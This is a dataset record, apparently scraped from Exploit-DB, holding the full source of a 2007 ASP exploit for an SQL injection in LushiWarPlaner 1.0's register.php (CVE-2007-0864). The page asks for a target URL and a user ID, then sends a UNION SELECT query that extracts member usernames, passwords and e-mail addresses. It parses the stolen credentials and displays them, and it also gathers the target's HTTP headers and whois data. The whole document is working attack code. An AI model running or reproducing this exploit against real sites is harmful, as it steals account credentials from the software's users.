{
  "id": "3288",
  "title": "LushiWarPlaner 1.0 - &#039;register.php&#039; SQL Injection",
  "cve": "CVE-2007-0864",
  "vuln_type": "sqli",
  "code": "<% Response.Buffer = True %>\r\n<% On Error Resume Next %>\r\n<% Server.ScriptTimeout = 100 %>\r\n\r\n<%\r\n'===============================================================================================\r\n'[Script Name: LushiWarPlaner 1.0 (register.php) Remote SQL Injection Exploit\r\n'[Coded by   : ajann\r\n'[Author     : ajann\r\n'[Contact    : :(\r\n'[S.Page     : http://www.lushi.de\r\n'[ExploitName: exploit2.asp\r\n\r\n'[Note  : exploit file name =>exploit2.asp\r\n'[Update: + Get Header\r\n'[Update: + Get Whois Info\r\n'===============================================================================================\r\n\r\n%>\r\n\r\n<%\r\n\r\ntitle=\"LushiWarPlaner 1.0 (register.php) Remote SQL Injection Exploit\" 'Vuln Title\r\n\r\n%>\r\n<html>\r\n<title><% = title %></title>\r\n<head>\r\n<meta name=\"generator\" content=\"Microsoft FrontPage 5.0\">\r\n\r\n<script language=\"JavaScript\">    \r\n  function functionControl1(){  \r\n        setTimeout(\"functionControl2()\",2000);    \r\n     }  \r\n  \r\n  function functionControl2(){  \r\n            if(document.form1.field1.value==\"\"){  \r\n \r\n     alert(\"[Exploit Failed]=>The Username and Password Didnt Take,Try Again\");\r\n        \r\n                             }  \r\n                        }\r\n\r\n  function writetext() {\r\n\r\n            if(document.form1.field1.value==\"\"){\r\ndocument.getElementById('htmlAlani').innerHTML='<font face=\\\"Verdana\\\" size=\\\"1\\\" color=\\\"#008000\\\">There is a problem... The Data Didn\\'t Take </font>'\r\n\r\n                            }\r\n                 }\r\n  function write(){  \r\n        setTimeout(\"writetext()\",1000);    \r\n     }  \r\n  \r\n</script>\r\n\r\n\r\n</head>\r\n<body bgcolor=\"#000000\" link=\"#008000\" vlink=\"#008000\" alink=\"#008000\">\r\n\r\n<center>\r\n<font face=\"Verdana\" size=\"2\" color=\"#008000\"><b><a href=\"exploit2.asp\"><u><% = title %>\r\n</b></u></a></font><br><br>\r\n<table border=\"1\" cellpadding=\"0\" cellspacing=\"0\" style=\"border-collapse: collapse\" width=\"35%\" id=\"AutoNumber1\" bordercolorlight=\"#808080\" bordercolordark=\"#008000\" bordercolor=\"#808080\">\r\n  <tr>\r\n    <td width=\"50%\" bgcolor=\"#808000\" onmouseover=\"javascript:this.style.background='#808080';\" onmouseout=\"javascript:this.style.background='#808000';\">\r\n    <font face=\"Arial\" size=\"1\"><b><font color=\"#FFFFFF\">TARGET:</font>Example:[http://x.com/path]</b></font><p>\r\n    <b><font face=\"Arial\" size=\"1\" color=\"#FFFFFF\">USER ID:</font></b><font face=\"Arial\" size=\"1\"><b>Example:[User \r\n    ID=1]</b></font></p>\r\n  </td>\r\n    <td width=\"50%\">\r\n <center>\r\n<form method=\"post\" name=\"form1\" action=\"exploit2.asp?islem=get\">\r\n<input type=\"text\" name=\"text1\" value=\"http://\" size=\"25\" style=\"background-color: #808080\"><br><input type=\"text\" name=\"id\" value=\"10\" size=\"25\" style=\"background-color: #808080\">\r\n<input type=\"submit\" value=\"Get\"></form></center></td>\r\n  </tr>\r\n\r\n</table>\r\n\r\n<div id=htmlAlani></div>\r\n\r\n<%\r\nislem = Request.QueryString(\"islem\")    \r\n\r\nIf islem = \"hata1\" Then \r\nResponse.Write \"<font face=\"\"Verdana\"\" size=\"\"1\"\" color=\"\"#008000\"\">There is a problem! Please complete to the whole spaces</font>\"\r\nEnd If\r\n\r\nIf islem = \"hata2\" Then \r\nResponse.Write \"<font face=\"\"Verdana\"\" size=\"\"1\"\" color=\"\"#008000\"\">There is a problem! Please right character use</font>\"\r\nEnd If\r\n\r\nIf islem = \"hata3\" Then \r\nResponse.Write \"<font face=\"\"Verdana\"\" size=\"\"1\"\" color=\"\"#008000\"\">There is a problem! Add \"\"http://\"\"</font>\"\r\nEnd If\r\n\r\nIf islem = \"hata4\" Then \r\nResponse.Write \"<font face=\"\"Verdana\"\" size=\"\"1\"\" color=\"\"#008000\"\">There is a problem! Just Numeric Character!</font>\"\r\nEnd If\r\n\r\n%>\r\n\r\n<%  \r\n\r\nIf islem = \"get\" Then\r\n\r\nid= Request.Form(\"id\")\r\n\r\nfile=\"register.php?id=\"\r\nsql=\"-1%20union%20select%200,mail,2,3,4,5,6,\"\r\nsql1=\"concat(char(85,115,101,114,110,97,\"\r\nsql2=\"109,101,58),char(32),Name,c\"\r\nsql3=\"har(32),char(80,97,115,115,119,11\"\r\nsql4=\"1,114,100,58),Passwort),8,9%20fr\"\r\nsql5=\"om%20members%20where%20id=\"\r\nsql6=id\r\n\r\n\r\nidform = Request.Form(\"id\")\r\ntargettext = Request.Form(\"text1\")\r\narama=InStr(1, targettext, \"union\" ,1)\r\narama2=InStr(1, targettext, \"http://\" ,1)\r\n\r\nIf targettext=\"\" Then\r\nResponse.Redirect(\"exploit2.asp?islem=hata1\")\r\n\r\nElse\r\nIf arama>0 then \r\nResponse.Redirect(\"exploit2.asp?islem=hata2\")\r\n\r\nElse\r\nIf arama2=0 then \r\nResponse.Redirect(\"exploit2.asp?islem=hata3\")\r\n\r\nElse\r\nIF Not IsNumeric(idform) Then\r\nResponse.Redirect(\"exploit2.asp?islem=hata4\")\r\n\r\nElse\r\n%> \r\n\r\n<%\r\n\r\ntarget1 = targettext+file+sql+sql1+sql2+sql3+sql4+sql5+sql6\r\n\r\nPublic Function take(come)\r\nSet objtake = Server.CreateObject(\"Microsoft.XMLHTTP\" )\r\nWith objtake\r\n  .Open \"GET\" , come, FALSE\r\n  .sEnd\r\n  \r\ntake =  .Responsetext\r\nEnd With\r\nSET objtake = Nothing\r\nEnd Function\r\n\r\n\r\nget_username = take(target1)\r\n\r\ngetdata=InStr(get_username,\"0  0/\" )\r\nusername=Mid(get_username,getdata+5,90)\r\n\r\nDim metin\r\nmetin = take(target1)  \r\n\r\nDim objReg\r\nSet objReg = New RegExp\r\nobjReg.Global = False\r\nobjReg.IgnoreCase = True\r\n\r\nobjReg.Pattern = \"Username: [A-Za-z0-9\u00fd]+ Pass\"\r\nDim calistir, istediginString\r\nSet calistir = objReg.Execute(metin)\r\n\r\n\r\nIf calistir.Count = 0 Then\r\n     Response.write \"Not True\"\r\nElse\r\n      basusername = Replace(calistir.Item(0), \"Username: \" , \"\" )\r\n      basusername = Replace(basusername, \" Pass\" , \"\" )\r\n\r\n\r\n\r\n      objReg.Pattern = \"Password:[A-Za-z0-9\u00fd]+</td>\"\r\n      Set calistir = objReg.Execute(metin)\r\n      baspassword = Replace(calistir.Item(0), \"Password:\" , \"\" )\r\n      baspassword = Replace(baspassword, \"</td>\" , \"\" )\r\n\r\n     \r\n      objReg.Pattern = \"target=\"\"_blank\"\" title=\"\"0\"\">[A-Za-z0-9@.]+</a>\"\r\n      Set calistir = objReg.Execute(metin)\r\n      basemail = Replace(calistir.Item(0), \"target=\"\"_blank\"\" title=\"\"0\"\">\" , \"\" )\r\n      basemail = Replace(basemail, \"</a>\" , \"\" )\r\n\r\nEnd If  \r\n\r\n\r\n \r\nSet bulunanlar = Nothing\r\nSet objReg = Nothing\r\n\r\n%>\r\n\r\n<center>\r\n<font face=\"Verdana\" size=\"2\" color=\"#008000\"> <u><b>\r\najann<br></b></u></font><br>\r\n\r\n<table border=\"1\" cellpadding=\"0\" cellspacing=\"0\" style=\"border-collapse: collapse\" width=\"35%\" id=\"AutoNumber1\" bordercolorlight=\"#808080\" bordercolordark=\"#008000\" bordercolor=\"#808080\">\r\n  <tr>\r\n    <td width=\"50%\" bgcolor=\"#808000\" onmouseover=\"javascript:this.style.background='#808080';\" onmouseout=\"javascript:this.style.background='#808000';\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n    <b><font size=\"2\" face=\"Arial\">Username:</font></b></td>\r\n    <td width=\"80%\">\r\n&nbsp;<b><font color=\"#C0C0C0\" size=\"2\" face=\"Verdana\"><%=basusername%></b></font></p>\r\n </td>\r\n  </tr>\r\n\r\n  <tr>\r\n    <td width=\"50%\" bgcolor=\"#808000\" onmouseover=\"javascript:this.style.background='#808080';\" onmouseout=\"javascript:this.style.background='#808000';\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n    <b><font size=\"2\" face=\"Arial\">Password:</font></b></td>\r\n    <td width=\"80%\">\r\n&nbsp;<b><font color=\"#C0C0C0\" size=\"2\" face=\"Verdana\"><%=baspassword%></b></font></p>\r\n </td>\r\n  </tr>\r\n\r\n <tr>\r\n    <td width=\"50%\" bgcolor=\"#808000\" onmouseover=\"javascript:this.style.background='#808080';\" onmouseout=\"javascript:this.style.background='#808000';\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n    <b><font size=\"2\" face=\"Arial\">Email:</font></b></td>\r\n    <td width=\"80%\">\r\n&nbsp;<b><font color=\"#C0C0C0\" size=\"2\" face=\"Verdana\"><%=basemail%></b></font></p>\r\n </td>\r\n  </tr>\r\n\r\n</table>\r\n</center> \r\n\r\n  <br>\r\n\r\n\r\n<%\r\nhedef = targettext\r\nDim objem\r\nSet objem = Server.CreateObject(\"MSXML2.ServerXMLHTTP\")\r\nobjem.Open \"GET\" , hedef , false\r\n\r\nobjem.sEnd\r\n\r\nstrHTML = objem.ResponseText\r\n\r\nheader=objem.getallResponseheaders()\r\nResponse.Write \"<center>\"\r\nResponse.Write \"<b>\"\r\nResponse.Write \"<p><font color=\"\"#008000\"\" face=\"\"Verdana\"\" size=\"\"2\"\">Header Bilgileri</font></p>\"\r\nResponse.Write \"</b>\"\r\nResponse.Write \"<p><font color=\"\"#008000\"\" face=\"\"Verdana\"\" size=\"\"2\"\">\" & header & \"</font></p>\"\r\nResponse.Write \"<p><font color=\"\"#008000\"\" face=\"\"Verdana\"\" size=\"\"2\"\"><b>Whois</b></font></p>\"\r\nResponse.Write \"<p><font size=\"\"2\"\" color=\"\"#008000\"\">Site:</font><font color=\"\"#008000\"\" size=\"\"1\"\">[google.com]</font></p>\"\r\nResponse.Write \"</center>\"\r\nSet objem=Nothing\r\n\r\n%>\r\n\r\n<center><form method=\"post\" name=\"form2\" action=\"exploit2.asp?islem=whois\">\r\n  <p>\r\n  <input type=\"text\" name=\"whoissite\" size=\"20\" value=\"domainwhois\" style=\"font-family: Verdana; font-size: 10pt; color: #008000; border: 1px dashed #008000; background-color: #000000\">\r\n  <input type=\"submit\" value=\"Yolla\" name=\"B1\"></p>\r\n</form></center>\r\n\r\n     \r\n<br>\r\n\r\n\r\n<form method=\"POST\" name=\"form2\" action=\"#\">    \r\n<input type=\"hidden\" name=\"field1\" size=\"20\" value=\"sdfsd\">     \r\n</form> \r\n\r\n\r\n<script language=\"JavaScript\">\r\nwrite()\r\nfunctionControl1()\r\n</script>\r\n\r\n</b></font>\r\n\r\n</body>\r\n</html>\r\n\r\n<%\r\nEnd If\r\nEnd If\r\nEnd If\r\nEnd If\r\nEnd If\r\n\r\n%>\r\n\r\n\r\n<%\r\nIf islem = \"whois\" Then\r\nsite = Request.Form(\"whoissite\")\r\ntarget1 = \"http://reports.internic.net/cgi/whois?whois_nic=\" & site & \"&type=domain\"\r\n\r\nPublic Function take(come)\r\nSet objtake = Server.CreateObject(\"Microsoft.XMLHTTP\" )\r\nWith objtake\r\n  .Open \"GET\" , come, FALSE\r\n  .sEnd\r\ntake =  .Responsetext\r\nEnd With\r\nSet objtake = Nothing\r\nEnd Function\r\n\r\nremoteadres=take(target1)\r\n\r\ndim baslangic , bitis\r\nbaslangic = \"<pre>\"\r\nbitis = \"</pre>\"\r\ndim x , abc\r\nx = 0\r\nabc = 0\r\ndim sonuc\r\nsonuc = \"\"\r\n\r\nDo Until abc = 2\r\nx = x + 1\r\nIf Mid(remoteadres,x,Len(bitis)) = bitis and abc = 1 Then\r\nabc = abc + 1\r\nEnd If\r\nIf Mid(remoteadres,x,Len(baslangic)) = baslangic Then\r\nabc = abc + 1\r\nElse\r\nIf abc = 1 Then\r\nsonuc = sonuc + Mid(remoteadres,x,1)\r\nEnd If\r\nEnd If\r\nLoop\r\n\r\nSet objtake=Nothing\r\n \r\n%>\r\n\r\n<center>\r\n<b><font color=\"#008000\" face=\"Verdana\" size=\"2\">Whois Bilgileri</font></b><p>\r\n<textarea rows=\"20\" name=\"S1\" cols=\"68\" style=\"font-family: Verdana; font-size: 10pt; color: #008000; border: 1px dotted #008000; background-color: #000000\">\r\n<% Response.Write \"<\" & sonuc %>\r\n&lt;/textarea&gt;\r\n</p>\r\n</center>\r\n\r\n<center><form method=\"post\" name=\"form2\" action=\"exploit2.asp?islem=whois\">\r\n  <p>\r\n  <input type=\"text\" name=\"whoissite\" size=\"20\" value=\"domainwhois\" style=\"font-family: Verdana; font-size: 10pt; color: #008000; border: 1px dashed #008000; background-color: #000000\">\r\n  <input type=\"submit\" value=\"Yolla\" name=\"B1\"></p>\r\n</form></center>\r\n\r\n\r\n\r\n<%\r\nEnd If\r\n%>\r\n\r\n<%\r\nResponse.Write \"<br>\"\r\nResponse.Write \"<center>\"\r\nResponse.Write \"<pre class=\"\"info\"\">\"\r\nResponse.Write \"<font color=\"\"#C0C0C0\"\" size=\"\"1\"\">\"\r\nResponse.Write \"En iyi \"\r\nResponse.Write \"</font>\"\r\nResponse.Write \"<font size=\"\"1\"\" color=\"\"#808080\"\"><span class=\"\"info2\"\">\"\r\nResponse.Write \"1152x864 \"\r\nResponse.Write \"</span></font>\"\r\nResponse.Write \"<font color=\"\"#C0C0C0\"\" size=\"\"1\"\">\u00e7\u00f6z\u00fcn\u00fcrl\u00fck ve \"\r\nResponse.Write \"<span class=\"\"info2\"\"><font size=\"\"1\"\" color=\"\"#808080\"\">Firefox </font></span>\"\r\nResponse.Write \"ile g\u00f6r\u00fcnt\u00fcl\u00fcnebilir.</font></pre>\"\r\n\r\nResponse.Write \"<pre class=\"\"info\"\">\"\r\nResponse.Write \"<font color=\"\"#C0C0C0\"\" size=\"\"1\"\">\"\r\nResponse.Write \"Exploit coded by \"\r\nResponse.Write \"</font>\"\r\nResponse.Write \"<font size=\"\"1\"\" color=\"\"#808080\"\"><span class=\"\"info2\"\">\"\r\nResponse.Write \"ajann\"\r\nResponse.Write \"</span></font>\"\r\nResponse.Write \"</center>\"\r\n\r\n%>\r\n\r\n# milw0rm.com [2007-02-08]",
  "url": "https://www.exploit-db.com/exploits/3288"
}